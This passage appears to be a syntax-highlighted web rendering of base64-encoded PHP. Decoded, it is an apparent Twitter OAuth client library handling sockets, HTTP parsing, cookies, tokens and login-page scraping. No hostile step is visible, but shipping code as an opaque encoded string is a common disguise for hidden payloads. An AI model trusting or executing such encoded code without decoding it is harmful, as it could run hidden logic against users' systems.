PWZhbHNlKXtyZXR1cm4gJHRoaXMtPmdldEF1dGhVcmwoJ2F1dGhvcml6ZScsJGZvcmNlX2xvZ2luKTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIGdldEF1dGhlbnRpY2F0ZVVybCgkZm9yY2VfbG9naW49ZmFsc2Upe3JldHVybiAkdGhpcy0</span><span class="o">+</span><span class="nx">Z2V0QXV0aFVybCgnYXV0aGVudGljYXRlJywkZm9yY2VfbG9naW4pO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0SGlzdG9yeSgkbmFtZSwkdmFsdWUpeyR0aGlzLT5oaXN0b3J5W3NlbGY6OmZpbHRlcigkbmFtZSldPShpbnQpJHZhbHVlO3JldHVybiAkdGhpczt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIHNldENvb2tpZSgkbmFtZSwkdmFsdWUpeyR0aGlzLT5jb29raWVzW3NlbGY6OmZpbHRlcigkbmFtZSldPXNlbGY6OmZpbHRlcigkdmFsdWUpO3JldHVybiAkdGhpczt9cHJpdmF0ZSBmdW5jdGlvbiBnZXRBdXRoVXJsKCRtb2RlLCRmb3JjZV9sb2dpbil7JHVybD0iaHR0cHM6Ly9hcGkudHdpdHRlci5jb20vb2F1dGgveyRtb2RlfSI7JHBhcmFtcz1hcnJheSgnb2F1dGhfdG9rZW4nPT4kdGhpcy0</span><span class="o">+</span><span class="nx">cmVxdWVzdFRva2VuLCdmb3JjZV9sb2dpbic9PiRmb3JjZV9sb2dpbj8nMSc6bnVsbCApO3JldHVybiAkdXJsLic</span><span class="o">/</span><span class="nx">Jy5odHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbXMsJycsJyYnKTt9fWZpbmFsIGNsYXNzIFR3aXN0RXhjZXB0aW9uIGV4dGVuZHMgUnVudGltZUV4Y2VwdGlvbntwcml2YXRlICRyZXF1ZXN0PW51bGw7cHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRtZXNzYWdlLCRjb2RlLFR3aXN0UmVxdWVzdCAkcmVxdWVzdD1udWxsKXskdGhpcy0</span><span class="o">+</span><span class="nx">cmVxdWVzdD0kcmVxdWVzdDtwYXJlbnQ6Ol9fY29uc3RydWN0KCRtZXNzYWdlLCRjb2RlKTt9cHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXtyZXR1cm4gc3ByaW50ZignWyVkXSAlcycsJHRoaXMtPmdldENvZGUoKSwkdGhpcy0</span><span class="o">+</span><span class="nx">Z2V0TWVzc2FnZSgpKTt9cHVibGljIGZ1bmN0aW9uIGdldFJlcXVlc3QoKXtyZXR1cm4gJHRoaXMtPnJlcXVlc3Q7fX1jbGFzcyBUd2lzdEV4ZWN1dGVyIGV4dGVuZHMgVHdpc3RVbnNlcmlhbGl6YWJsZXtjb25zdCBTVEVQX1dSSVRFX1JFUVVFU1RfSEVBREVSUz0wO2NvbnN0IFNURVBfUkVBRF9SRVNQT05TRV9IRUFERVJTPTE7Y29uc3QgU1RFUF9SRUFEX1JFU1BPTlNFX0xPTkdFRD0yO2NvbnN0IFNURVBfUkVBRF9SRVNQT05TRV9DSFVOS0VEX1NJWkU9Mztjb25zdCBTVEVQX1JFQURfUkVTUE9OU0VfQ0hVTktFRF9DT05URU5UPTQ7Y29uc3QgU1RFUF9GSU5JU0hFRD01O3ByaXZhdGUgJGNhbGxiYWNrO3ByaXZhdGUgJGFyZ3M9YXJyYXkoKTtwcml2YXRlICRpbnRlcnZhbD0wO3ByaXZhdGUgJHRpbWVyPTA7cHJpdmF0ZSAkam9icz1hcnJheSgpO3ByaXZhdGUgJHRpbWVvdXQ9MS4wO2ZpbmFsIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkYXJncyl7aWYoISRhcmdzPWZ1bmNfZ2V0X2FyZ3MoKSl7dGhyb3cgbmV3IEludmFsaWRBcmd1bWVudEV4Y2VwdGlvbignUmVxdWlyZWQgYXQgbGVhc3QgMSBUd2lzdFJldWVzdCBpbnN0YW5jZS4nKTt9JHRoaXMtPmpvYnM9YXJyYXkoKTthcnJheV93YWxrX3JlY3Vyc2l2ZSgkYXJncyxhcnJheSgkdGhpcywnc2V0UmVxdWVzdCcpKTt9ZmluYWwgcHVibGljIGZ1bmN0aW9uIHNldEludGVydmFsKCRjYWxsYmFjaz1udWxsLCRpbnRlcnZhbD0wLGFycmF5ICRhcmdzPWFycmF5KCkpeyR0aGlzLT5jYWxsYmFjaz1pc19jYWxsYWJsZSgkY2FsbGJhY2spPyRjYWxsYmFjazpudWxsOyR0aGlzLT5pbnRlcnZhbD1hYnMoKGZsb2F0KSRpbnRlcnZhbCk7JHRoaXMtPmFyZ3M9JGFyZ3M7JHRoaXMtPnRpbWVyPW1pY3JvdGltZSh0cnVlKSskdGhpcy0</span><span class="o">+</span><span class="nx">aW50ZXJ2YWw7cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gc2V0VGltZW91dCgkc2VjPTEuMCl7JHRoaXMtPnRpbWVvdXQ9YWJzKChmbG9hdCkkc2VjKTtyZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBzdGFydCgpe2ZvcmVhY2goJHRoaXMtPmpvYnMgYXMgJGpvYil7c2VsZjo6aW5pdGlhbGl6ZSgkam9iKTskam9iLT5yZXF1ZXN0LT5zZXRSZXNwb25zZSgpO3N3aXRjaCh0cnVlKXtjYXNlISgkam9iLT5yZXF1ZXN0IGluc3RhbmNlb2YgVHdpc3RSZXF1ZXN0KTpjYXNlISgkam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsIGluc3RhbmNlb2YgVHdpc3RDcmVkZW50aWFsKTpjb250aW51ZSAyO31zZWxmOjpjb25uZWN0KCRqb2IpO31yZXR1cm4gJHRoaXM7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBhYm9ydCgpe2ZvcmVhY2goJHRoaXMtPmpvYnMgYXMgJGpvYil7c2VsZjo6aW5pdGlhbGl6ZSgkam9iKTt9cmV0dXJuICR0aGlzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gaXNSdW5uaW5nKCl7Zm9yZWFjaCgkdGhpcy0</span><span class="o">+</span><span class="nx">am9icyBhcyAkam9iKXtpZigkam9iLT5zdGVwIT09c2VsZjo6U1RFUF9GSU5JU0hFRCl7cmV0dXJuIHRydWU7fX1yZXR1cm4gZmFsc2U7fWZpbmFsIHB1YmxpYyBmdW5jdGlvbiBydW4oKXtpZigkdGhpcy0</span><span class="o">+</span><span class="nx">Y2FsbGJhY2speyR0aW1lPW1pY3JvdGltZSh0cnVlKTtpZigkdGhpcy0</span><span class="o">+</span><span class="nx">dGltZXI8PSR0aW1lKXskdGhpcy0</span><span class="o">+</span><span class="nx">dGltZXIrPSR0aGlzLT5pbnRlcnZhbDtjYWxsX3VzZXJfZnVuY19hcnJheSgkdGhpcy0</span><span class="o">+</span><span class="nx">Y2FsbGJhY2ssJHRoaXMtPmFyZ3MpO319JHJlYWQ9JHdyaXRlPSRyZXN1bHRzPWFycmF5KCk7JGV4Y2VwdD1udWxsO2ZvcmVhY2goJHRoaXMtPmpvYnMgYXMgJGk9PiRqb2Ipe3N3aXRjaCgkam9iLT5zdGVwKXtjYXNlIHNlbGY6OlNURVBfRklOSVNIRUQ6Y29udGludWUgMjtjYXNlIHNlbGY6OlNURVBfV1JJVEVfUkVRVUVTVF9IRUFERVJTOiR3cml0ZVskaV09JGpvYi0</span><span class="o">+</span><span class="nx">ZnA7Y29udGludWUgMjtkZWZhdWx0OiRyZWFkWyRpXT0kam9iLT5mcDt9fWlmKCEkcmVhZCBhbmQhJHdyaXRlKXtyZXR1cm4gJHJlc3VsdHM7fSRzZWM9KGludCkkdGhpcy0</span><span class="o">+</span><span class="nx">dGltZW91dDskbXNlYz0oaW50KSgkdGhpcy0</span><span class="o">+</span><span class="nx">dGltZW91dCoxMDAwMDAwKSUxMDAwMDAwO2lmKGZhbHNlPT09c3RyZWFtX3NlbGVjdCgkcmVhZCwkd3JpdGUsJGV4Y2VwdCwkc2VjLCRtc2VjKSl7dGhyb3cgbmV3IFR3aXN0RXhjZXB0aW9uKCdGYWlsZWQgdG8gc2VsZWN0IHN0cmVhbS4nLDApO31mb3JlYWNoKCR0aGlzLT5qb2JzIGFzICRpPT4kam9iKXtzd2l0Y2goJGpvYi0</span><span class="o">+</span><span class="nx">c3RlcCl7Y2FzZSBzZWxmOjpTVEVQX1dSSVRFX1JFUVVFU1RfSEVBREVSUzppc3NldCgkd3JpdGVbJGldKWFuZCBzZWxmOjp3cml0ZVJlcXVlc3RIZWFkZXJzKCRqb2IpO2JyZWFrO2Nhc2Ugc2VsZjo6U1RFUF9SRUFEX1JFU1BPTlNFX0hFQURFUlM6aXNzZXQoJHJlYWRbJGldKWFuZCBzZWxmOjpyZWFkUmVzcG9uc2VIZWFkZXJzKCRqb2IpO2JyZWFrO2Nhc2Ugc2VsZjo6U1RFUF9SRUFEX1JFU1BPTlNFX0NIVU5LRURfU0laRTppc3NldCgkcmVhZFskaV0pYW5kIHNlbGY6OnJlYWRSZXNwb25zZUNodW5rZWRTaXplKCRqb2IpO2JyZWFrO2Nhc2Ugc2VsZjo6U1RFUF9SRUFEX1JFU1BPTlNFX0xPTkdFRDppZihpc3NldCgkcmVhZFskaV0pYW5kIG51bGwhPT0kcmVzdWx0PXNlbGY6OnJlYWRSZXNwb25zZUxvbmdlZCgkam9iKSl7JHJlc3VsdHNbXT0kam9iLT5yZXF1ZXN0LT5zZXRSZXNwb25zZSgkcmVzdWx0KTt9YnJlYWs7Y2FzZSBzZWxmOjpTVEVQX1JFQURfUkVTUE9OU0VfQ0hVTktFRF9DT05URU5UOmlmKGlzc2V0KCRyZWFkWyRpXSlhbmQgbnVsbCE9PSRyZXN1bHQ9c2VsZjo6cmVhZFJlc3BvbnNlQ2h1bmtlZENvbnRlbnQoJGpvYikpeyRyZXN1bHRzW109JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">c2V0UmVzcG9uc2UoJHJlc3VsdCk7fX19cmV0dXJuICRyZXN1bHRzO31maW5hbCBwdWJsaWMgZnVuY3Rpb24gcnVuQWxsKCl7Zm9yZWFjaChuZXcgVHdpc3RJdGVyYXRvcigkdGhpcylhcyAkcmVxdWVzdCl7fXJldHVybiAkdGhpczt9cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gaW5pdGlhbGl6ZShzdGRDbGFzcyAkam9iPW51bGwpe2lmKCRqb2I9PT1udWxsKXskam9iPW5ldyBzdGRDbGFzczt9JGpvYi0</span><span class="o">+</span><span class="nx">c3RlcD1zZWxmOjpTVEVQX0ZJTklTSEVEOyRqb2ItPmZwPWZhbHNlOyRqb2ItPnNpemU9Jyc7JGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyPScnOyRqb2ItPmluY29tcGxldGU9Jyc7JGpvYi0</span><span class="o">+</span><span class="nx">bGVuZ3RoPTA7JGpvYi0</span><span class="o">+</span><span class="nx">aW5mbz1hcnJheSgpO3JldHVybiAkam9iO31wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiBjb25uZWN0KHN0ZENsYXNzICRqb2Ipe3N3aXRjaCh0cnVlKXtjYXNlISRmcD1zZWxmOjpjcmVhdGVTb2NrZXQoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">aG9zdCk6Y2FzZSFzdHJlYW1fc2V0X2Jsb2NraW5nKCRmcCwwKTp0aHJvdyBuZXcgVHdpc3RFeGNlcHRpb24oIkZhaWxlZCB0byBjb25uZWN0OiB7JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">aG9zdH0iLDAsJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdCk7ZGVmYXVsdDokam9iLT5zdGVwPXNlbGY6OlNURVBfV1JJVEVfUkVRVUVTVF9IRUFERVJTOyRqb2ItPmZwPSRmcDt9cmV0dXJuICRqb2I7fXByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGNyZWF0ZVNvY2tldCgkaG9zdCl7c3RhdGljJGZsYWc7aWYoJGZsYWc9PT1udWxsKXskZmxhZz1QSFBfT1M9PT0nV0lOTlQnfHx2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sJzUuMy4xJyk8MDt9cmV0dXJuICRmbGFnP0Bmc29ja29wZW4oInNzbDovL3skaG9zdH0iLDQ0Myk6QHN0cmVhbV9zb2NrZXRfY2xpZW50KCJzc2w6Ly97JGhvc3R9OjQ0MyIsJGR1bW15LCRkdW1teSwwLDYpO31wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiB3cml0ZVJlcXVlc3RIZWFkZXJzKHN0ZENsYXNzICRqb2Ipe2lmKCRqb2ItPmJ1ZmZlcj09PScnKXskam9iLT5idWZmZXI9JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">YnVpbGRIZWFkZXJzKCk7fWlmKGZhbHNlIT09JHRtcD1md3JpdGUoJGpvYi0</span><span class="o">+</span><span class="nx">ZnAsJGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyLDgxOTIpKXskam9iLT5idWZmZXI9KHN0cmluZylzdWJzdHIoJGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyLCR0bXApO31pZigkam9iLT5idWZmZXIhPT0nJyl7cmV0dXJuO30kam9iLT5zdGVwPSRqb2ItPnJlcXVlc3QtPndhaXRSZXNwb25zZT9zZWxmOjpTVEVQX1JFQURfUkVTUE9OU0VfSEVBREVSUzpzZWxmOjpTVEVQX0ZJTklTSEVEOyRqb2ItPnJlcXVlc3QtPmNyZWRlbnRpYWwtPnNldEhpc3RvcnkoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQsaXNzZXQoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">aGlzdG9yeVskam9iLT5yZXF1ZXN0LT5lbmRwb2ludF0pPyRqb2ItPnJlcXVlc3QtPmNyZWRlbnRpYWwtPmhpc3RvcnlbJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnRdKzE6MSk7cmV0dXJuO31wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiByZWFkUmVzcG9uc2VIZWFkZXJzKHN0ZENsYXNzICRqb2Ipe2lmKGlzX3N0cmluZygkYnVmZmVycz1zZWxmOjpmcmVhZFVudGlsU2VwYXJhdG9yKCRqb2ItPmZwLCRqb2ItPmJ1ZmZlciwiXHJcblxyXG4iKSkpeyRqb2ItPmJ1ZmZlcj0kYnVmZmVycztyZXR1cm47fWZvcmVhY2goZXhwbG9kZSgiXHJcbiIsJGJ1ZmZlcnNbMF0pYXMgJGk9PiRsaW5lKXtzZWxmOjpyZWFkUmVzcG9uc2VIZWFkZXIoJGpvYiwkaSwkbGluZSk7fWlmKCFlbXB0eSgkam9iLT5pbmZvWydjb250ZW50LWxlbmd0aCddKSl7JGpvYi0</span><span class="o">+</span><span class="nx">c3RlcD1zZWxmOjpTVEVQX1JFQURfUkVTUE9OU0VfTE9OR0VEOyRqb2ItPmJ1ZmZlcj0kYnVmZmVyc1sxXTskam9iLT5sZW5ndGg9JGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1snY29udGVudC1sZW5ndGgnXTt9ZWxzZWlmKGlzc2V0KCRqb2ItPmluZm9bJ3RyYW5zZmVyLWVuY29kaW5nJ10pKXskam9iLT5zdGVwPXNlbGY6OlNURVBfUkVBRF9SRVNQT05TRV9DSFVOS0VEX1NJWkU7JGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyPScnOyRqb2ItPmxlbmd0aD0wOyRqb2ItPnNpemU9JGJ1ZmZlcnNbMV07fWVsc2V7dGhyb3cgbmV3IFR3aXN0RXhjZXB0aW9uKCdEZXRlY3RlZCBtYWxmb3JtZWQgcmVzcG9uc2UgaGVhZGVyLicsKGludCkkam9iLT5pbmZvWydjb2RlJ10sJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdCk7fX1wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiByZWFkUmVzcG9uc2VMb25nZWQoc3RkQ2xhc3MgJGpvYil7aWYoaXNfc3RyaW5nKCRidWZmZXJzPXNlbGY6OmZyZWFkVW50aWxMZW5ndGgoJGpvYi0</span><span class="o">+</span><span class="nx">ZnAsJGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyLCRqb2ItPmxlbmd0aCkpKXskam9iLT5idWZmZXI9JGJ1ZmZlcnM7cmV0dXJuO30kam9iLT5zdGVwPXNlbGY6OlNURVBfRklOSVNIRUQ7aWYoaXNzZXQoJGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1snY29udGVudC1lbmNvZGluZyddKSl7JGJ1ZmZlcnNbMF09Z3ppbmZsYXRlKHN1YnN0cigkYnVmZmVyc1swXSwxMCwtOCkpO31yZXR1cm4gc2VsZjo6ZGVjb2RlKCRqb2IsJGJ1ZmZlcnNbMF0pO31wcml2YXRlIHN0YXRpYyBmdW5jdGlvbiByZWFkUmVzcG9uc2VDaHVua2VkU2l6ZShzdGRDbGFzcyAkam9iKXtpZihpc19zdHJpbmcoJGJ1ZmZlcnM9c2VsZjo6ZnJlYWRVbnRpbFNlcGFyYXRvcigkam9iLT5mcCwkam9iLT5zaXplLCJcclxuIikpKXskam9iLT5zaXplPSRidWZmZXJzO3JldHVybjt9c3dpdGNoKHRydWUpe2Nhc2UkYnVmZmVyc1swXT09PScwJzokam9iLT5zdGVwPXNlbGY6OlNURVBfRklOSVNIRUQ7JGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyPScnOyRqb2ItPnNpemU9Jyc7JGpvYi0</span><span class="o">+</span><span class="nx">aW5jb21wbGV0ZT0nJzskam9iLT5sZW5ndGg9MDtyZXR1cm47Y2FzZSRidWZmZXJzWzBdPT09Jyc6Y2FzZSAyPT09JHRtcD1oZXhkZWMoJGJ1ZmZlcnNbMF0pKzI6dGhyb3cgbmV3IFR3aXN0RXhjZXB0aW9uKCdEZXRlY3RlZCBtYWxmb3JtZWQgcmVzcG9uc2UgYm9keS4nLChpbnQpJGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1snY29kZSddLCRqb2ItPnJlcXVlc3QpO2RlZmF1bHQ6JGpvYi0</span><span class="o">+</span><span class="nx">c3RlcD1zZWxmOjpTVEVQX1JFQURfUkVTUE9OU0VfQ0hVTktFRF9DT05URU5UOyRqb2ItPmJ1ZmZlcj0kYnVmZmVyc1sxXTskam9iLT5zaXplPScnOyRqb2ItPmxlbmd0aD0kdG1wO319cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gcmVhZFJlc3BvbnNlQ2h1bmtlZENvbnRlbnQoc3RkQ2xhc3MgJGpvYil7aWYoaXNfc3RyaW5nKCRidWZmZXJzPXNlbGY6OmZyZWFkVW50aWxMZW5ndGgoJGpvYi0</span><span class="o">+</span><span class="nx">ZnAsJGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyLCRqb2ItPmxlbmd0aCkpKXskam9iLT5idWZmZXI9JGJ1ZmZlcnM7cmV0dXJuO30kYnVmZmVyc1swXT1zdWJzdHIoJGJ1ZmZlcnNbMF0sMCwtMik7JGpvYi0</span><span class="o">+</span><span class="nx">YnVmZmVyPScnOyRqb2ItPmxlbmd0aD0wOyRqb2ItPnN0ZXA9c2VsZjo6U1RFUF9SRUFEX1JFU1BPTlNFX0NIVU5LRURfU0laRTtpZihzdWJzdHIoJGJ1ZmZlcnNbMF0sLTEpPT09IlxuIil7JHZhbHVlPSRqb2ItPmluY29tcGxldGUuJGJ1ZmZlcnNbMF07JGpvYi0</span><span class="o">+</span><span class="nx">c2l6ZT0kYnVmZmVyc1sxXTskam9iLT5pbmNvbXBsZXRlPScnO3JldHVybiBwcmVnX21hdGNoKCcvXEFccyorXHovJywkYnVmZmVyc1swXSk</span><span class="o">/</span><span class="nx">bnVsbDpzZWxmOjpkZWNvZGUoJGpvYiwkdmFsdWUpO30kam9iLT5zaXplKz0kYnVmZmVyc1sxXTskam9iLT5pbmNvbXBsZXRlLj0kYnVmZmVyc1swXTtyZXR1cm47fXByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIHJlYWRSZXNwb25zZUhlYWRlcihzdGRDbGFzcyAkam9iLCRvZmZzZXQsJGxpbmUpe2lmKCRvZmZzZXQpe2xpc3QoJGtleSwkdmFsdWUpPWV4cGxvZGUoJzogJywkbGluZSwyKSthcnJheSgxPT4nJyk7JGtleT1zdHJ0b2xvd2VyKCRrZXkpO3N3aXRjaCgka2V5KXtjYXNlICdzZXQtY29va2llJzpsaXN0KCRrLCR2KT1leHBsb2RlKCc9JywkbGluZSwyKSthcnJheSgxPT4nJyk7bGlzdCgkdik9ZXhwbG9kZSgiOyIsJHYpOyRqb2ItPnJlcXVlc3QtPmNyZWRlbnRpYWwtPnNldENvb2tpZSh1cmxkZWNvZGUoJGspLHVybGRlY29kZSgkdikpO2JyZWFrO2RlZmF1bHQ6JGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1ska2V5XT10cmltKCR2YWx1ZSwnIicpO319ZWxzZXtsaXN0KCRwcm90b2NvbCwkY29kZSwkbWVzc2FnZSk9ZXhwbG9kZSgnICcsJGxpbmUsMykrYXJyYXkoMT0</span><span class="o">+</span><span class="nx">JzAnLDI9PicnKTskam9iLT5pbmZvKz1jb21wYWN0KCdwcm90b2NvbCcsJ2NvZGUnLCdtZW1zc2FnZScpO319cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZnJlYWRVbnRpbFNlcGFyYXRvcigkZnAsJGJ1ZmZlciwkc2VwYXJhdG9yKXt3aGlsZSh0cnVlKXskaXRlbXM9ZXhwbG9kZSgkc2VwYXJhdG9yLCRidWZmZXIsMik7aWYoaXNzZXQoJGl0ZW1zWzFdKSl7cmV0dXJuICRpdGVtczt9aWYoaXNzZXQoJHJldHJ5KSl7cmV0dXJuICRidWZmZXI7fSRidWZmZXIuPSR0bXA9ZnJlYWQoJGZwLDgxOTIpOyRyZXRyeT10cnVlO319cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZnJlYWRVbnRpbExlbmd0aCgkZnAsJGJ1ZmZlciwkbGVuZ3RoKXt3aGlsZSh0cnVlKXtpZigkbGVuZ3RoPD1zdHJsZW4oJGJ1ZmZlcikpe3JldHVybiBhcnJheSgoc3RyaW5nKXN1YnN0cigkYnVmZmVyLDAsJGxlbmd0aCksKHN0cmluZylzdWJzdHIoJGJ1ZmZlciwkbGVuZ3RoKSk7fWlmKGlzc2V0KCRyZXRyeSkpe3JldHVybiAkYnVmZmVyO30kYnVmZmVyLj0kdG1wPWZyZWFkKCRmcCw4MTkyKTskcmV0cnk9dHJ1ZTt9fXByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGRlY29kZShzdGRDbGFzcyAkam9iLCR2YWx1ZSl7aWYoaW5fYXJyYXkoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQsYXJyYXkoJy9vYXV0aC9hdXRob3JpemUnLCcvb2F1dGgvYXV0aGVudGljYXRlJyksdHJ1ZSkpeyRvYmplY3Q9c2VsZjo6ZGVjb2RlU2NyYXBpbmcoJGpvYiwkdmFsdWUpO31lbHNleyRvYmplY3Q9c2VsZjo6ZGVjb2RlTm9ybWFsKCRqb2IsJHZhbHVlKTt9aWYoJG9iamVjdCBpbnN0YW5jZW9mIFR3aXN0RXhjZXB0aW9uIGFuZCAkam9iLT5yZXF1ZXN0LT50aHJvdyl7dGhyb3cgJG9iamVjdDt9aWYoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">bG9naW4gYW5kICRqb2ItPnJlcXVlc3QtPmVuZHBvaW50IT09Jy9vYXV0aC9hY2Nlc3NfdG9rZW4nKXskam9iLT5yZXF1ZXN0LT5wcm9jZWVkKCk7c2VsZjo6aW5pdGlhbGl6ZSgkam9iKTtzZWxmOjpjb25uZWN0KCRqb2IpO3JldHVybiBudWxsO31yZXR1cm4gJG9iamVjdDt9cHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZGVjb2RlTm9ybWFsKHN0ZENsYXNzICRqb2IsJHZhbHVlKXtzd2l0Y2godHJ1ZSl7Y2FzZSBudWxsIT09JG9iamVjdD1qc29uX2RlY29kZSgkdmFsdWUpOmNhc2UgZmFsc2UhPT0kb2JqZWN0PWpzb25fZGVjb2RlKGpzb25fZW5jb2RlKEBzaW1wbGV4bWxfbG9hZF9zdHJpbmcoJHZhbHVlKSkpOmNhc2UhcGFyc2Vfc3RyKCR2YWx1ZSwkb2JqZWN0KWFuZCAkb2JqZWN0PShvYmplY3QpJG9iamVjdCBhbmQgaXNzZXQoJG9iamVjdC0</span><span class="o">+</span><span class="nx">b2F1dGhfdG9rZW4sJG9iamVjdC0</span><span class="o">+</span><span class="nx">b2F1dGhfdG9rZW5fc2VjcmV0KTpjYXNlIHByZWdfbWF0Y2goIkA8dGl0bGU</span><span class="o">+</span><span class="nx">RXJyb3IgXGQrKyAoW148XSsrKTwvdGl0bGU</span><span class="o">+</span><span class="nx">QCIsJHZhbHVlLCRtKWFuZCAkb2JqZWN0PShvYmplY3QpYXJyYXkoJ2Vycm9yJz0</span><span class="o">+</span><span class="nx">JG1bMV0pOmNhc2UhaXNzZXQoJGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1snY29udGVudC10eXBlJ10pfHwkam9iLT5pbmZvWydjb250ZW50LXR5cGUnXSE9PSdhcHBsaWNhdGlvbi9qc29uJ2FuZCAkb2JqZWN0PShvYmplY3QpYXJyYXkoJ2Vycm9yJz0</span><span class="o">+</span><span class="nx">dHJpbShzdHJpcF90YWdzKCR2YWx1ZSkpKTpjYXNlJG9iamVjdD0ob2JqZWN0KWFycmF5KCdlcnJvcic9PiJVbmtub3duIGVycm9yIG9uIHBhcnNpbmc6IHskdmFsdWV9Iik6fWlmKGlzc2V0KCRvYmplY3QtPm9hdXRoX3Rva2VuLCRvYmplY3QtPm9hdXRoX3Rva2VuX3NlY3JldCkpe2lmKGlzc2V0KCRvYmplY3QtPnNjcmVlbl9uYW1lLCRvYmplY3QtPnVzZXJfaWQpKXskam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsLT5zZXRTY3JlZW5OYW1lKCRvYmplY3QtPnNjcmVlbl9uYW1lKTskam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsLT5zZXRVc2VySWQoJG9iamVjdC0</span><span class="o">+</span><span class="nx">dXNlcl9pZCk7fWlmKCRqb2ItPnJlcXVlc3QtPmVuZHBvaW50PT09Jy9vYXV0aC9yZXF1ZXN0X3Rva2VuJyl7JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">c2V0UmVxdWVzdFRva2VuKCRvYmplY3QtPm9hdXRoX3Rva2VuLCRvYmplY3QtPm9hdXRoX3Rva2VuX3NlY3JldCk7fWlmKCRqb2ItPnJlcXVlc3QtPmVuZHBvaW50PT09Jy9vYXV0aC9hY2Nlc3NfdG9rZW4nKXskam9iLT5yZXF1ZXN0LT5jcmVkZW50aWFsLT5zZXRBY2Nlc3NUb2tlbigkb2JqZWN0LT5vYXV0aF90b2tlbiwkb2JqZWN0LT5vYXV0aF90b2tlbl9zZWNyZXQpO319aWYoJGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">ZW5kcG9pbnQ9PT0nLzEuMS9hY2NvdW50L3ZlcmlmeV9jcmVkZW50aWFscy5qc29uJyl7aWYoaXNzZXQoJG9iamVjdC0</span><span class="o">+</span><span class="nx">c2NyZWVuX25hbWUsJG9iamVjdC0</span><span class="o">+</span><span class="nx">aWRfc3RyKSl7JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">c2V0U2NyZWVuTmFtZSgkb2JqZWN0LT5zY3JlZW5fbmFtZSk7JGpvYi0</span><span class="o">+</span><span class="nx">cmVxdWVzdC0</span><span class="o">+</span><span class="nx">Y3JlZGVudGlhbC0</span><span class="o">+</span><span class="nx">c2V0VXNlcklkKCRvYmplY3QtPmlkX3N0cik7fX1pZihpc3NldCgkam9iLT5pbmZvWyd4LXR3aXR0ZXItbmV3LWFjY291bnQtb2F1dGgtYWNjZXNzLXRva2VuJ10sJGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1sneC10d2l0dGVyLW5ldy1hY2NvdW50LW9hdXRoLXNlY3JldCddKSl7JG9iamVjdC0</span><span class="o">+</span><span class="nx">b2F1dGhfdG9rZW49JGpvYi0</span><span class="o">+</span><span class="nx">aW5mb1sneC10d2l0dGVyLW5ldy1hY2NvdW50LW9hdXRoLWFjY2Vzcy10b2tlbiddOyRvYmplY3QtPm9hdXRoX3Rva2VuX3NlY3JldD0kam9iLT5pbmZvWyd4LXR3aXR0ZXItbmV3LWFjY291bnQtb2F1dGgtc2VjcmV0J107fXN3aXRjaCh0cnVlKXtjYXNlIGlzc2V0KCRvYmplY3QtPmVycm9ycylhbmQgaXNfYXJyYXkoJG9iamVjdC0</span><span class="o">+</span><span 